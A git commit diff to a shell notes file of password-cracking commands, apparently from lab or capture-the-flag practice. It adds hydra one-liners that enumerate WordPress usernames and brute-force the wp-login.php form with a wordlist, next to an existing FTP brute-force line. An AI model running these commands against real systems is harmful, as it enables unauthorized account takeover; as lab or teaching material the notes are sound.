f6801ccf9ba5771ecfc30d2a9a8becfe25c593ec
michwojt <xy97@wp.pl>
2024-12-06 22:37:55 +0100

    Add cracking username and password for username with hydra

--- PasswordCracking.sh
+++ PasswordCracking.sh
@@ -1,5 +1,9 @@
 #Password cracking using list with popular passwords
 hydra -l user -P passlist.txt ftp://192.168.0.1
+#Finding valid username
+hydra -L file+name -p test target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30
+#Crak password for username
+hydra -l username -P fsocity.dic 10.10.28.2 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30
 
 #Cracking passphrase for private key
 
